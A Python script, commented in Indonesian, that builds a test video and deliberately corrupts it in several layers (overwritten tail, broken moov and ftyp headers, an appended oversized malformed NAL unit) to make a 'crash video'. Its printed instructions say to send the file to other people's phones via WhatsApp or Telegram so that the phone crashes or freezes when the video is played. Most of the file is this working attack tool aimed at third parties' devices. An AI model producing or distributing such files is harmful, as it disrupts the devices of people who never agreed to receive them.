#!/usr/bin/env python3
"""
BUFFER MAKER - FIXED VERSION
Step 1: Bikin video normal pake ffmpeg (dengan moov atom di awal)
Step 2: Buffer/corrupt video tsb
Step 3: Simpan di folder (NO AUTO PLAY)
"""

import os
import sys
import subprocess
import shutil
import random
import time

# ============================================================
# KONFIGURASI
# ============================================================
OUTPUT_FOLDER = "buffered_videos"
NORMAL_VIDEO_NAME = "lv_0_20260503222753.mp4"
BUFFERED_NAME = "buffered_crash.mp4"
BUFFERED_PATH = os.path.join(OUTPUT_FOLDER, BUFFERED_NAME)

# ============================================================
# STEP 1: BUAT FOLDER
# ============================================================
print("\n" + "="*60)
print("   BUFFER MAKER FIXED - Bikin Video Crash Sendiri")
print("="*60)

os.makedirs(OUTPUT_FOLDER, exist_ok=True)
print(f"[✓] Folder: {OUTPUT_FOLDER}/")

# ============================================================
# STEP 2: BIKIN VIDEO NORMAL PAKAI FFMPEG (DIJAMIN PUNYA MOOV)
# ============================================================
print("\n[== MEMBUAT VIDEO NORMAL (dengan moov) ==]")

# Opsi 1: Video test pattern 10 detik
cmd_make_normal = [
    "ffmpeg", "-f", "lavfi", "-i", 
    "testsrc=duration=10:size=640x480:rate=30:pattern=smpte",
    "-c:v", "libx264", "-preset", "ultrafast",
    "-movflags", "+faststart",  # <-- INI PENTING: moov di awal
    "-y", NORMAL_VIDEO_NAME
]

print(f"[*] Menjalankan: {' '.join(cmd_make_normal)}")
result = subprocess.run(cmd_make_normal, capture_output=True, text=True)

if result.returncode != 0:
    print("[!] ffmpeg error, coba method alternatif...")
    # Method alternatif: bikin pakai OpenCV (tanpa ffmpeg)
    try:
        import cv2
        import numpy as np
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(NORMAL_VIDEO_NAME, fourcc, 30.0, (640, 480))
        for i in range(300):  # 10 detik
            frame = np.zeros((480, 640, 3), dtype=np.uint8)
            color = (i * 85 % 255, i * 170 % 255, i * 255 % 255)
            cv2.rectangle(frame, (i*2 % 640, 0), (i*2 % 640 + 50, 480), color, -1)
            cv2.putText(frame, f"Frame {i}", (50, 50), 
                       cv2.FONT_HERSHEY_SIMPLEX, 1, (255,255,255), 2)
            out.write(frame)
        out.release()
        print(f"[✓] Video normal dibuat pakai OpenCV: {NORMAL_VIDEO_NAME}")
    except Exception as e:
        print(f"[-] Gagal bikin video: {e}")
        sys.exit(1)
else:
    print(f"[✓] Video normal dibuat: {NORMAL_VIDEO_NAME}")

# Cek video normal punya moov
check_moov = subprocess.run([
    "ffprobe", "-v", "error", "-show_entries", "format=format_name",
    NORMAL_VIDEO_NAME
], capture_output=True, text=True)
print(f"[✓] Video normal valid: {check_moov.stdout.strip()}")

# ============================================================
# STEP 3: FUNGSI CARI MOOV DI MANA SAJA
# ============================================================
def find_moov(filepath):
    with open(filepath, "rb") as f:
        # Cari di awal 2MB
        f.seek(0)
        data = f.read(2*1024*1024)
        pos = data.find(b"moov")
        if pos != -1:
            return pos, "awal"
        
        # Cari di akhir 2MB
        f.seek(0, 2)
        size = f.tell()
        f.seek(max(0, size - 2*1024*1024))
        data = f.read(2*1024*1024)
        pos = data.find(b"moov")
        if pos != -1:
            return max(0, size - 2*1024*1024) + pos, "akhir"
    return -1, None

# ============================================================
# STEP 4: BUFFER/CRASH VIDEO (DENGAN MULTI LAYER CORRUPTION)
# ============================================================
def make_crash_video(input_file, output_file):
    print(f"\n[== MEMBUAT VIDEO BUFFER (CRASH DI AKHIR) ==]")
    
    # Copy file
    shutil.copy2(input_file, output_file)
    print(f"[*] Copy: {input_file} -> {output_file}")
    
    with open(output_file, "r+b") as f:
        f.seek(0, 2)
        total = f.tell()
        
        # === LAYER 1: RUSAK 20% AKHIR ===
        corrupt_start = int(total * 0.80)
        f.seek(corrupt_start)
        garbage_len = total - corrupt_start
        garbage = bytes([random.randint(0,255) for _ in range(garbage_len)])
        f.write(garbage)
        print(f"[✓] Layer 1: {garbage_len:,} bytes terakhir dirusak")
        
        # === LAYER 2: CARI & RUSAK MOOV ===
        moov_pos, location = find_moov(output_file)
        if moov_pos != -1:
            f.seek(moov_pos - 4)
            f.write(b"\xff\xff\xff\xff")
            print(f"[✓] Layer 2: moov atom dirusak di posisi {moov_pos} ({location})")
        else:
            print(f"[!] Layer 2: moov tidak ditemukan, skip")
        
        # === LAYER 3: RUSAK FTYP ===
        f.seek(4)
        f.write(b"\x00\x00\x00\x00")
        print(f"[✓] Layer 3: ftyp header dirusak")
        
        # === LAYER 4: INJECT CRASH NALU ===
        f.seek(0, 2)
        # NALU yang sangat besar dan malformed
        crash_nalu = b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\xff" * 200000
        f.write(crash_nalu)
        print(f"[✓] Layer 4: Crash NALU {len(crash_nalu):,} bytes diinjeksi")
        
        # === LAYER 5: TULIS "CRASH" STRING ===
        f.write(b"CRASH_HERE_SYSTEM_WILL_DIE_" + os.urandom(50))
    
    final_size = os.path.getsize(output_file)
    print(f"\n[✓✓✓] VIDEO BUFFER SELESAI!")
    print(f"  - Output: {output_file}")
    print(f"  - Size: {final_size:,} bytes (naik {final_size - total:,} bytes)")
    return output_file

# ============================================================
# STEP 5: EKSEKUSI UTAMA
# ============================================================
print(f"\n[== PROSES BUFFER ==]")
buffered_file = make_crash_video(NORMAL_VIDEO_NAME, BUFFERED_PATH)

# ============================================================
# STEP 6: TAMPILKAN HASIL
# ============================================================
print(f"\n[ISI FOLDER {OUTPUT_FOLDER}/]")
os.system(f"ls -lh {OUTPUT_FOLDER}/")

print("\n" + "="*60)
print("   SELESAI! Video buffer siap.")
print("="*60)
print(f"""
Video asli (normal):   {NORMAL_VIDEO_NAME}
Video buffer (crash):  {BUFFERED_PATH}

CARA PAKAI:
1. Kirim {BUFFERED_NAME} ke HP lain via WhatsApp/Telegram/Share
2. Buka video pake pemain video bawaan HP
3. Video akan jalan normal sampai detik terakhir → HP CRASH/FREEZE

CATATAN:
- Video normal tetap ada (buat referensi)
- Video buffer sudah siap di folder {OUTPUT_FOLDER}/
- NO AUTO PLAY di Termux
""")

# Optional: cek apakah video buffer bisa dibaca oleh ffprobe (harusnya error)
print("\n[TEST: Cek video buffer dengan ffprobe (harusnya error)]")
result = subprocess.run([
    "ffprobe", "-v", "error", BUFFERED_PATH
], capture_output=True, text=True)
if result.stderr:
    print(f"[✓] Video buffer CORRUPT (seperti yg diinginkan): {result.stderr[:100]}...")
else:
    print("[!] Video buffer masih readable, coba jalankan ulang")
